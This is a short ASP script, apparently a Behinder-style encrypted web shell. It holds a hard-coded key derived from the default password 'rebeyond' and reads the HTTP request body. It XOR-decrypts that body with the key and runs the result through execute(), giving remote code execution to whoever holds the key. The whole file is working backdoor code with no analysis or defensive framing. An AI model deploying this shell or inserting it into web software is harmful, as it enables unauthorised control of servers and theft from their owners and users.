<%
Response.CharSet = "UTF-8" 
k="e45e329feb5d925b" '该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond
Session("k")=k
size=Request.TotalBytes
content=Request.BinaryRead(size)
For i=1 To size
result=result&Chr(ascb(midb(content,i,1)) Xor Asc(Mid(k,(i and 15)+1,1)))
Next
execute(result)
%>